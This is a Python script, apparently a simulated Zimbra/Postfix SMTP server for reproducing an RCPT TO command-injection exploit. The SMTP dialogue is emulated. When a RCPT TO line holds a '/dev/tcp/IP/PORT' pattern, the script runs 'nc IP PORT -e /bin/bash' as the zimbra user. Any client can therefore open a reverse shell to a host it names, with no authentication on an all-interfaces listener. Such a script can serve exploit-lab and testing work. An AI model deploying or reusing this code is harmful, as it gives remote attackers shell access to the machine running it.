#!/usr/bin/env python3
import socket
import subprocess
import threading
import re

class SMTPSimulator:
    def __init__(self, listen_port=2525, bind_port=25):
        self.listen_port = listen_port
        self.bind_port = bind_port
        self.running = False
        
    def execute_payload(self, lhost, lport):
        try:
            print('[!] EXECUTING: nc ' + lhost + ' ' + lport + ' -e /bin/bash')
            
            # Execute nc -e /bin/bash as zimbra user
            cmd = 'nc ' + lhost + ' ' + lport + ' -e /bin/bash'
            subprocess.Popen(['su', '-', 'zimbra', '-c', cmd], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL)
            
            print('[+] Reverse shell executed as zimbra user to ' + lhost + ':' + lport)
            
        except Exception as e:
            print('[!] Error executing payload: ' + str(e))
    
    def handle_client(self, client_socket, addr):
        try:
            print('[+] New connection from ' + str(addr))
            client_socket.send(b'220 zimbra-docker.zimbra.io ESMTP Postfix\r\n')
            
            while True:
                data = client_socket.recv(1024).decode('utf-8', errors='ignore').strip()
                if not data:
                    break
                
                print('[*] Received: ' + data)
                
                if data.upper().startswith('EHLO'):
                    response = '250-zimbra-docker.zimbra.io\r\n250-PIPELINING\r\n250-SIZE 10240000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250-DSN\r\n250 CHUNKING\r\n'
                    client_socket.send(response.encode())
                    print('[+] Sent EHLO response')
                elif data.upper().startswith('MAIL FROM'):
                    client_socket.send(b'250 2.1.0 Ok\r\n')
                    print('[+] Sent MAIL FROM response')
                elif data.upper().startswith('RCPT TO'):
                    print('[!] RCPT TO DETECTED: ' + data)
                    
                    # Extract IP and port from the payload
                    if 'dev/tcp/' in data:
                        # Look for pattern like: dev/tcp/IP/PORT
                        tcp_match = re.search(r'dev/tcp/([^/]+)/(\d+)', data)
                        if tcp_match:
                            lhost = tcp_match.group(1)
                            lport = tcp_match.group(2)
                            print('[!] REVERSE SHELL DETECTED: ' + lhost + ':' + lport)
                            
                            # Execute reverse shell in background
                            thread = threading.Thread(target=self.execute_payload, args=(lhost, lport))
                            thread.daemon = True
                            thread.start()
                    
                    client_socket.send(b'250 2.1.5 Ok\r\n')
                    print('[+] Sent RCPT TO response')
                elif data.upper().startswith('DATA'):
                    client_socket.send(b'354 End data with <CR><LF>.<CR><LF>\r\n')
                    print('[+] Sent DATA response')
                elif data == '.':
                    client_socket.send(b'250 2.0.0 Ok: queued\r\n')
                    print('[+] Sent message queued response')
                elif data.upper().startswith('QUIT'):
                    client_socket.send(b'221 2.0.0 Bye\r\n')
                    print('[+] Sent QUIT response')
                    break
                else:
                    client_socket.send(b'250 Ok\r\n')
                    print('[+] Sent generic OK response')
                    
        except Exception as e:
            print('[!] Error: ' + str(e))
        finally:
            client_socket.close()
            print('[+] Connection closed for ' + str(addr))
    
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server.bind(('0.0.0.0', self.listen_port))
            server.listen(5)
            self.running = True
            
            print('[+] SMTP Simulator running on port ' + str(self.listen_port))
            print('[+] Ready to simulate SMTP responses and execute payloads')
            print('[+] Will execute: nc IP PORTA -e /bin/bash as zimbra user')
            
            while self.running:
                try:
                    client, addr = server.accept()
                    thread = threading.Thread(target=self.handle_client, args=(client, addr))
                    thread.daemon = True
                    thread.start()
                except KeyboardInterrupt:
                    print('\n[!] Shutdown requested...')
                    break
                except Exception as e:
                    print('[!] Error accepting connection: ' + str(e))
                    
        except Exception as e:
            print('[!] Error starting server: ' + str(e))
        finally:
            server.close()
            print('[+] Server stopped')

if __name__ == '__main__':
    simulator = SMTPSimulator(listen_port=2525, bind_port=25)
    simulator.start()
